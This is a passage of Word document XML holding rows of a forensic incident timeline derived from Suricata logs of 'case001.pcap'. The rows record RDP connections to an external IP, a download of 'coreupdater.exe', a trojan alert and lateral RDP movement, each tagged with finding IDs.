            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:26.344228</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.10:3389 -&gt; 194.61.24.102:40046</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:27.226262</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>low</w:t>
              <w:br/>
              <w:t>ET INFO RDP - Response To External Host | TCP 10.42.85.10:3389 -&gt; 194.61.24.102:40054 | Misc activity | 1:APtj1Vt0V/H9g6mkVjcfylB8rkU= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011, I-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.939835</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>ET INFO Executable Download from dotted-quad Host | TCP 10.42.85.10:62410 -&gt; 194.61.24.102:80 | Potentially Bad Traffic | 1:u/j8zDTczy431sRgtCbNVlYztwk= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#306</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.940063</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP request</w:t>
              <w:br/>
              <w:t>/coreupdater.exe</w:t>
              <w:br/>
              <w:t>http_hostname=194.61.24.102 | http_http_method=GET | http_status=200 | http_http_user_agent=Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko | http_http_content_type=application/x-msdos-program | http_length=7168 | src_ip=10.42.85.10 | dest_ip=194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.940653</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Files transferred (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#106</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011, F-018, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:25:18.565676</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>203.78.103.109</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.10:62414 -&gt; 203.78.103.109:443 failed state=closed bytes=51044/932653</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#27979</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:25:19.071794</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10.42.85.10:62414 | A Network Trojan was detected | 1:AEtaQJ4Pfkk0lfr1mrIy2qsaW8Q= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#72</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.285340</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.115</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.10:62514 -&gt; 10.42.85.115:3389 rdp state=closed bytes=875256/452944</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#21411</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.115:3389 -&gt; 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#281</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-011, F-024</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:36:23.467377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.10:62514 -&gt; 10.42.85.115:3389</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:36:23.515604</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.115</w:t>
              <w:br/>
              <w:t>UDP 10.42.85.10:63121 -&gt; 10.42.85.115:3389 failed state=established bytes=283842/6695207</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#31238</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018, F-031, I-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:05.286189</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS handshake</w:t>
              <w:br/>
              <w:t>microsoftedgewelcome.microsoft.com</w:t>
              <w:br/>
              <w:t>tls_sni=microsoftedgewelcome.microsoft.com | dest_ip=52.171.136.200 | dest_port=443 | tls_version=TLS 1.2 | tls_subject=C=US, ST=WA, L=Redmond, O=Microsoft Corporation, OU=Microsoft Corporation, CN=microsoftedgewelcome.microsoft.com | tls_issuerdn=C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, OU=Microsoft IT, CN=Microsoft IT TLS CA 2 | tls_ja3_hash=10ee8d30a5d01c042afd7b2b205facc4 | tls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16207</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:26.940438</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP request</w:t>
              <w:br/>
              <w:t>/</w:t>
              <w:br/>
              <w:t>http_hostname=194.61.24.102 | http_http_method=GET | http_status=200 | http_http_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19041 | http_http_content_type=text/html | http_length=228 | src_ip=10.42.85.115 | dest_ip=194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#153</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029, F-032, I-015, T-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:26.941704</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Files transferred (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file transferred over the network</w:t>
              <w:br/>
              <w:t>/</w:t>
              <w:br/>
              <w:t>app_proto=http | http_hostname=194.61.24.102 | src_ip=194.61.24.102 | dest_ip=10.42.85.115 | fileinfo_size=228 | fileinfo_sha256=6978f8fa2bf5afbe1a074401b923ead519ce89471d83376f5cfda50c12bc2d77 | fileinfo_md5=614645af648513231c283090faa5c469 | fileinfo_state=CLOSED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#137</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029, I-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411351</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
